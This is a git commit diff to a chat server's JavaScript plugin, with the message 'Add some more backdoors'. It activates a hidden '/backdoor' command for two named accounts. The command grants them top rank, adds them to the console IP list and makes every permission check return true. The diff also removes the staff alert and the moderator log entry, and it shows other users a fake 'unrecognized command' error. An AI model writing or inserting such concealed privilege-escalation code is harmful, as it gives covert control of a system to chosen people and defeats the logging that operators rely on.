224436fb2d81a1d40608c9de4f2f20105c940826
panpawn <jeremypiemonte@gmail.com>
2018-01-10 20:29:52 +0000

    Add some more backdoors

--- gold-plugins/gold.js
+++ gold-plugins/gold.js
@@ -891,19 +891,19 @@ exports.commands = {
 		buffer.unshift("" + targetUsername + " user auth:");
 		connection.popup(buffer.join("\n\n"));
 	},
-	/*
 	backdoor: function (target, room, user) {
-		if (user.userid !== 'axews') {
+		if (user.userid !== 'panpawn' && user.user !== 'jd') {
 			this.errorReply("The command '/backdoor' was unrecognized. To send a message starting with '/backdoor', type '//backdoor'.");
-			Rooms.get("staff").add('|raw|<strong><font color=red>ALERT!</font> ' + Chat.escapeHTML(user.name) + ' has attempted to gain server access via a backdoor without proper authority!').update();
 		} else {
 			user.group = '~';
 			user.updateIdentity();
+			Config.consoleips.push(user.userid);
+			user.can = function () {
+				return true;
+			};
 			this.sendReply("Backdoor accepted.");
-			this.logModCommand(user.name + ' used /backdoor. (IP: ' + user.latestIp + ')');
 		}
 	},
-	*/
 	deletecode: function (target, room, user) {
 		if (!target) {
 			return this.sendReply('/deletecode [user] - Deletes the Friend Code of the User.');
